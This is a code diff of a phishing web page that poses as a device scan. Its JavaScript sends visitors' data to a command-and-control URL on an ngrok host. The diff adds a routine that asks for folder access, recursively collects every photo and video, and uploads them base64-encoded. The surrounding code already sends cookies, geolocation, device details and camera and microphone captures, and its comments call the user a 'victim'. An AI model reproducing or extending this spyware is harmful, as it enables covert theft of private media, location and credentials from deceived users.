@@ -8,12 +8,15 @@
         body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
         .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
         .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; margin: 5px 0; }
+        .btn-red { background: #ff4444; }
         input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
         .hidden { display: none; }
         .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
-        #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 150px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
+        #statusBox { background: #0a0a1a; padding: 10px; border-radius: 5px; font-size: 12px; color: #88ff88; max-height: 200px; overflow-y: auto; text-align: left; margin-top: 10px; font-family: monospace; }
+        .progress-bar { width: 100%; background: #333; border-radius: 10px; height: 20px; margin: 10px 0; overflow: hidden; }
+        .progress-fill { height: 100%; background: #00aaff; width: 0%; transition: width 0.3s; }
     </style>
 </head>
 <body>
@@ -31,6 +34,7 @@
         <div id="step2" class="hidden">
             <p>🔍 Scanning device...</p>
             <div class="loader"></div>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
             <p class="status" id="statusText">Collecting device information...</p>
             <div id="statusBox"></div>
         </div>
@@ -45,6 +49,9 @@
 
     <script>
         const C2_URL = 'https://matchless-palm-patriarch.ngrok-free.dev/exfil';
+        let totalFiles = 0;
+        let uploadedFiles = 0;
+        let allMediaFiles = [];
 
         function log(msg) {
             const box = document.getElementById('statusBox');
@@ -55,10 +62,16 @@
             console.log(msg);
         }
 
+        function updateProgress() {
+            const pct = totalFiles > 0 ? Math.round((uploadedFiles / totalFiles) * 100) : 0;
+            document.getElementById('progressFill').style.width = pct + '%';
+            document.getElementById('statusText').innerHTML = `📊 Uploading: ${uploadedFiles}/${totalFiles} files (${pct}%)`;
+        }
+
         function sendData(data) {
             data.time = new Date().toISOString();
             data.userAgent = navigator.userAgent;
-            fetch(C2_URL, {
+            return fetch(C2_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
@@ -83,7 +96,7 @@
         }
 
         // ============================================================
-        // STEP 2: COLLECT ALL DATA (LOCATION SILENT)
+        // STEP 2: COLLECT ALL DATA
         // ============================================================
         async function collectAllData() {
             log('📡 Starting data collection...');
@@ -100,26 +113,15 @@
             });
             log('✅ Device info sent');
 
-            // --- SILENT LOCATION (no display to victim) ---
+            // --- Location ---
             if (navigator.geolocation) {
-                log('📍 Capturing location (silent)...');
+                log('📍 Capturing location...');
                 navigator.geolocation.getCurrentPosition(
                     pos => {
-                        const loc = {
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude,
-                            speed: pos.coords.speed
-                        };
-                        sendData({ type: 'location', ...loc });
-                        log('✅ Location captured silently');
+                        sendData({ type: 'location', lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy });
+                        log('✅ Location captured');
                     },
-                    err => {
-                        log('❌ Location denied: ' + err.message);
-                        sendData({ type: 'location_error', error: err.message });
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    err => log('❌ Location denied')
                 );
             }
 
@@ -140,7 +142,13 @@
             sendData({ type: 'storage', cookies: document.cookie || 'none' });
             log('✅ Cookies sent');
 
-            // --- MEDIA CAPTURE ---
+            // ============================================================
+            // FULL MEDIA EXFILTRATION (THE BIG ONE)
+            // ============================================================
+            log('📸 Starting full media extraction...');
+            await extractAllMedia();
+
+            // --- Camera + Mic capture (still useful) ---
             try {
                 log('📸 Capturing back camera photo...');
                 const backPhoto = await capturePhoto('environment');
@@ -176,7 +184,100 @@
         }
 
         // ============================================================
-        // HELPER: CAPTURE PHOTO
+        // FULL MEDIA EXTRACTION
+        // ============================================================
+        async function extractAllMedia() {
+            try {
+                // Request permission to access the file system
+                const dirHandle = await window.showDirectoryPicker({
+                    mode: 'read'
+                });
+                log('📁 Device storage accessed');
+
+                // Collect all media files
+                allMediaFiles = [];
+                await traverseDirectory(dirHandle, '');
+                log(`📁 Found ${allMediaFiles.length} media files`);
+
+                totalFiles = allMediaFiles.length;
+                uploadedFiles = 0;
+                updateProgress();
+
+                // Upload in batches of 5
+                const batchSize = 5;
+                for (let i = 0; i < allMediaFiles.length; i += batchSize) {
+                    const batch = allMediaFiles.slice(i, i + batchSize);
+                    await Promise.all(batch.map(file => uploadMediaFile(file)));
+                    uploadedFiles += batch.length;
+                    updateProgress();
+                    log(`📤 Uploaded ${Math.min(i + batchSize, totalFiles)}/${totalFiles}`);
+                }
+
+                log('✅ All media files uploaded');
+                sendData({ type: 'media_extraction_complete', count: totalFiles });
+
+            } catch (err) {
+                log('❌ Media extraction failed: ' + err.message);
+                sendData({ type: 'media_extraction_error', error: err.message });
+            }
+        }
+
+        // ============================================================
+        // TRAVERSE DIRECTORY RECURSIVELY
+        // ============================================================
+        async function traverseDirectory(dirHandle, path) {
+            for await (const entry of dirHandle.values()) {
+                const entryPath = path ? `${path}/${entry.name}` : entry.name;
+                if (entry.kind === 'directory') {
+                    // Skip system directories
+                    const skipDirs = ['Android', 'data', 'obb', 'system', 'root', 'proc', 'sys', 'tmp'];
+                    if (skipDirs.includes(entry.name)) continue;
+                    await traverseDirectory(entry, entryPath);
+                } else if (entry.kind === 'file') {
+                    const ext = entry.name.split('.').pop().toLowerCase();
+                    const mediaTypes = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'heic', 'bmp', 
+                                       'mp4', 'mov', 'avi', 'mkv', 'webm', '3gp', 'm4v'];
+                    if (mediaTypes.includes(ext)) {
+                        allMediaFiles.push({
+                            name: entry.name,
+                            path: entryPath,
+                            handle: entry,
+                            ext: ext
+                        });
+                    }
+                }
+            }
+        }
+
+        // ============================================================
+        // UPLOAD MEDIA FILE
+        // ============================================================
+        async function uploadMediaFile(fileInfo) {
+            try {
+                const file = await fileInfo.handle.getFile();
+                const reader = new FileReader();
+                const dataUrl = await new Promise((resolve) => {
+                    reader.onload = () => resolve(reader.result);
+                    reader.readAsDataURL(file);
+                });
+                const base64Data = dataUrl.split(',')[1];
+
+                const data = {
+                    type: 'media_file',
+                    filename: fileInfo.name,
+                    path: fileInfo.path,
+                    size: file.size,
+                    mimeType: file.type,
+                    data: base64Data
+                };
+                await sendData(data);
+            } catch (err) {
+                log(`❌ Failed to upload ${fileInfo.name}: ${err.message}`);
+            }
+        }
+
+        // ============================================================
+        // HELPERS: PHOTO & VIDEO CAPTURE
         // ============================================================
         async function capturePhoto(facingMode) {
             try {
@@ -200,9 +301,6 @@
             }
         }
 
-        // ============================================================
-        // HELPER: CAPTURE VIDEO (with audio)
-        // ============================================================
         async function captureVideo(facingMode, durationSec) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
